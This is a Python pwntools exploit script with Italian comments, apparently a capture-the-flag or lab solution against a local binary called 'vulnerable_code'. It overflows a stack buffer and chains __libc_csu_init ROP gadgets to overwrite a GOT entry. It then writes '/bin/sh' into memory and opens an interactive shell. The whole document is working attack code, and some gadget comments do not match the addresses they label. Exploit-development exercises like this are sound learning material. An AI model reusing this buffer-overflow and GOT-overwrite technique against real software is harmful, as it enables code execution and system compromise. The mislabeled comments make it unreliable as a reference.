from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 136
binsh = "/bin/sh\x00"

# *--------------------- Gadgets --------------------*

where_to_write = int(hex(0x404060),0) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
_fini_pointer = p64(0x403e48) # puntatore alla sezione 
csu_gadget_compl = p64(0x401330) # gadget preso dalla sezione __libc_csu_init. mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword [r15 + rbx*8]; add rbx, 1; cmp rbp, rbx; 
                                 # jne 0x401330; add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
csu_gadget_pop =  p64(0x40134a) # gadget preso dalla sezione __libc_csu_init.
                                # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_r12_r13 = p64(0x40134c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40134e) # pop r12; pop r13; pop r14; pop r15; ret;
pop_rbp = p64(0x4011dd) # pop rbp; ret;
mov_rax_r13 = p64(0x4011b8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40114a) # mov qword ptr [r13], r12; ret;
add_mmrax_rbp = p64(0x401178) # add qword ptr [rax], rbp; ret;

# *--------------------- Funzioni -------------------*

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) :  # se w_off Ã¨ true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code','./lib.so') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("2")
p.recvlines(2) # inserisci username 

# *------  calculate offset between two lib func -----*

secretfunc_offset = libc.symbols["secret_function"] - libc.symbols["change_username"]
log.info(f"calcolato l'offset tra gli indirizzi di secret_function e change_username")

# *------  ROP CHAIN -> sovrascrittua GOT table ------*

rop = ROP(elf)
rop.raw(pop_r13) # pop r13; pop r14; pop r15; ret;
rop.raw(elf.got["change_username"]) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_rax_r13) # mov [r13], r12; ret;
rop.raw(pop_rbp) # pop rbp; ret;
rop.raw(secretfunc_offset) # rbp = offset secret_function - change_username
rop.raw(add_mmrax_rbp) # add [rax], rbp; add offset to got entry
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(binsh) # r12 = "/bin/sh\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x00
rop.raw(p64(0x00)) # r15 = 0x00
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;

# *-----  ROP CHAIN -> usando csu section gadget -----*

rop.raw(csu_gadget_pop)         # vedi gadget sopra
rop.raw(p64(0x00))              # rbx = 0x00
rop.raw(p64(0x01))              # rbp = 0x01
rop.raw(where_to_write)         # r12 = .data idx -> "/bin/sh\x00"
rop.raw(p64(0x00))              # r13 = 0x00
rop.raw(p64(0x00))              # r14 = 0x00
rop.raw(p64(0x403e48))          # r15 = ptr a gadget 
rop.raw(csu_gadget_compl)       # vedi gadget sopra
rop.raw(p64(0x00)*7)            # add rsp, 8; rbx ; pop rbp; pop r12; pop r13; pop r14; pop r15;
rop.call("change_username")     # chiamata a secret_function

payload = dict()
payload[offset] = rop
p.sendline(fit(payload))
p.interactive()

p.recvlines(3)

# *----------------------  END  ----------------------*